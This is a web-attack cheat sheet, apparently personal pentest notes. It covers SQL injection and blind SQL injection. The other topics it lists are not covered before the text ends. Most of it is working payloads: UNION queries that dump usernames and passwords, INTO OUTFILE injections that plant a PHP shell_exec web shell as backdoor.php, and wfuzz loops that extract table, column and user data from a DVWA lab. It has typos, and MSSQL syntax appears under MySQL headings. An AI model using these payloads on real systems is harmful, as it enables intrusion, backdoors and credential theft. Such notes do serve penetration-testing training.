# Web Application Attacks
1. SQL Injection
2. Blind SQL Injection
3. Local File Inclusion
4. Command Injection
5. LDAP Injection 
6. XSS (TBD)

## SQL Injection

### Manual Testing 
Test Strings
```
'                       # a single quote, treated as a string terminator
;                       # a semi-colon, treated as a query terminator
#                       # a comment, comments out anything that comes after that character in that line
-- -                    # a comment, same as above
/**/                    # a comment, starts with /* , ends with */ , and can contain anything in between 
AND 1=1                 # an AND statement, 1=1 tests for true condition. Use 1=2 to test for false conditions
OR 1=1                  # an OR statement, 1=1 tests for true condition, use 1=2 to test for false condition
sleep(5)                # delays the response by the number of seconds mentioned in the sleep command. 
```
Let's combine the terminators and comment characters above.
```
'                       # Try a single quote only to see any error, because of string termination  
';                      # Try a single quote and semi-colon to see any error, because of query termination
';-- -                  # Try a single quote and semi-colon and comment after the character to see if this succeeds. 
AND 1 = 1               # Try AND tru statement to see any error or success 
OR 1 = 1                # Try OR statement to see any error or success
' AND 1=1;-- -          # Try adding AND condition to see if this succeeds.  
' OR 1=1; -- -          # Try adding OR condition to see if this succeeds. 
1 and sleep(5)          # Try adding AND operator, sleep command to look at the time to get the response back
1' and sleep(5);-- -    # Try adding AND operator, sleep command plus string terminator, query terminator, and comment
```
Explore OR statement if you can get more data from this vulnerability
```
?param=<value> OR '1'='1    
?param=<value> OR 1=1 # 
?param=<value> OR 1=1 -- -

# Add 
?param=<value>' OR '1'='1    
?param=<value>' OR 1=1 # 
?param=<value>' OR 1=1 -- -



```

### Exploitation
The ORDER BY is used to enumerate the number of columns for UNION based SQL Injection attack.
 
```
1 order by 1
1 order by 1,2
1 order by 1,2,3
... (Until you see some column error)

' order by 1-- -
' order by 1,2-- -
' order by 1,2,3-- -
...(Until you see some column error)

' order by 1;-- -
' order by 1,2;-- -
' order by 1,2,3;-- -
...(Until you see some column error)

UNION SELECT 1,2-- -
UNION SELECT 1,2;-- -
```

Once you understand the number of teh columns, let's use UNION Clause to construct your SQL Injection query. 

#### --- MySQL Database Exfilternation Command ---

```
# @@version
UNION SELECT 1,@@version-- -

# user() 
UNION SELECT 1,user()-- -

# table_name from information_schema.tables
UNION SELECT 1,table_name from information_schema.tables-- -
UNION SELECT 1,table_name,3 from information_schema.tables-- -

# column_name from information_schema.columns where table_name='<table name>'
UNION SELECT 1,column_name from information_schema.columns where table_name='users'-- -
UNION SELECT 1,column_name,3 from information_schema.columns where table_name='users'-- -

# select <column name> from <table names>
UNION SELECT 1, username from users-- -
UNION SELECT 1, username, password from users-- -

# --- MySQL Code Execution Command - Ensure you know a file path --- 

# Browser
http://192.168.128.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'-- -
http://192.168.128.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE  "/var/www/html/backdoor.php"-- -
# http://192.168.128.10/backdoor.php?cmd=ipconfig 
	
# BURP (URL should be encoded)
POST /issue/checkByPriority?priority=Normal' union all select "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/srv/http/backdoor.php'-- -


# --- MySQL Database Exfilternation Command ---

' order by 1 -- -
' order by 2 -- -
' order by 3 -- - (If you have an error on this payload, so you have 2 rows to use.)

# There are a few variations. 
' order by 1
' order by 1-- ;
' order by 1-- -
' order by 1 #

# Check the table format 
' union select 1,1 from master..sysdatabases -- -
' union select Null,Null from master..sysdatabases -- -

# Check 
' union select @@version,1 -- -

# --- MySQL Database Exfilternation Command ---

```


## Blind SQL Injection

Boolean based Blind SQL Injection
```
#This technique is very useful when the tester finds a Blind SQL Injection situation in which nothing is known on the outcome of an operation. 


# Try the following query, but will not show anything 
' AND 1=1 #      
' AND 1=1 -- - 

# Try the following query instead, since you will need some successful query 
<value>' AND 1=1 #
<value>' AND 1=1 -- -

1' AND 1=1 #
1' AND 1=1 -- -

You should see the successful query and response back. 

If you see the query successful, try the following. 

# This will tell you the version number of database with the successful query
# We use substring(string, position, length) function

# Check database version number
1' and substring(@@version,1,1)=4-- -
1' and substring(@@version,1,1)=5-- -

# Check database name
# Use wfuzz and test with DVWA - Assume that the number of characters for database is less than 10. 

for i in $(seq 1 10); do wfuzz -c -z range,32-127 -b PHPSESSID=kjtjmhgjucv7tj5med9so25cu1 -b security=low --hw=901 "https://10.0.0.252/vulnerabilities/sqli/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),$i,1)))=FUZZ-- -&Submit=Submit#" | grep 218 | cut -d "\"" -f 2 | awk '{printf("%c",$1)}' ; done

#Check all table name under current database
# Assume the number of characters used for table name is less than 10 and the number of table name is also less than 10

for j in $(seq 0 10); do for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=901 -b PHPSESSID=kjtjmhgjucv7tj5med9so25cu1 -b security=low "https://10.0.0.252/vulnerabilities/sqli/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit $j,1),$i,1)))=FUZZ-- -&Submit=Submit#" | grep 218 | cut -d "\"" -f 2 | awk '{printf("%c",$1)}';done; echo ""; done

# Check all column names under the tablename 'users'

for j in $(seq 0 10); do for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=901 -b PHPSESSID=kjtjmhgjucv7tj5med9so25cu1 -b security=low "https://10.0.0.252/vulnerabilities/sqli/?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit $j,1),$i,1)))=FUZZ-- -&Submit=Submit#" | grep 218 | cut -d "\"" -f 2 | awk '{printf("%c",$1)}';done; echo "";done

# Check content
# Get the content user column from users table.

for j in $(seq 0 10); do for i in $(seq 1 50); do wfuzz -v -c -z range,32-127 --hw=901 -b PHPSESSID=kjtjmhgjucv7tj5med9so25cu1 -b security=low "https://10.0.0.252/vulnerabilities/sqli/?id=1' and (ascii(substr((select user_id from dvwa.users limit $j,1),$i,1)))=FUZZ-- -&Submit=Submit#"| grep 218 | cut -d "\"" -f 2 | awk '{printf("%c",$1)}';done; echo "";done

...








